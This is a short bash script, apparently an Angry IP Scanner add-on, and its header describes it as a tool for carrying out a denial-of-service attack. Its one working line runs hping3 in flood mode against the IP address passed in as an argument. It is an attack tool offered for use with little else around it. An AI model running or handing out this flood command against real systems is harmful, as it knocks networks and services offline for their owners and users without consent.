#!/bin/bash

# Angry IP information -----------------------------------------------------------
# | Angry Name                 | Execution String              | Run in Terminal | Directory |
# | -------------------------- | ----------------------------- | --------------- | --------- |
# | E_3 DOS      | THIS_FILE ${fetcher.hostname} | TRUE            |           |

# Script information -----------------------------------------------------------
# | Script Name       : SCRIPTS/E_3.sh
# | Description       : Script for carring out DOS attack
# | Directory         : ~/CYBER_TOOLS/SCRIPTS/
# | Author            : Jordon Archer
# | Date              : Feb 5 2024
# ------------------------------------------------------------------------------

## Create with human readable names

    IP_add=$1 # Ip address

# Define color variables

sudo hping3 --flood -V $IP_add

exit